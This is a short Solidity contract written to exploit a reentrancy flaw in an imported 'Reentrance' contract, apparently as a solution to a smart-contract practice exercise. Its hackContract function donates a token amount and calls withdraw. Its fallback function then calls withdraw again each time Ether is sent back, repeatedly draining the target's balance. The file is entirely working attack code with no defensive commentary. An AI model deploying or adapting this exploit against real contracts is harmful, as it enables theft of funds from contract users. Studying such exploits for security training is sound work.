// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentreance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentreance = Reentrance(contractAddress);
    }

    // Fallback is called when Reentrance sends Ether to this contract.
    fallback() external payable {
        reentreance.withdraw();
    }

    function hackContract() external {
        reentreance.donate{value: 1}(address(this));
        reentreance.withdraw();
    }
}
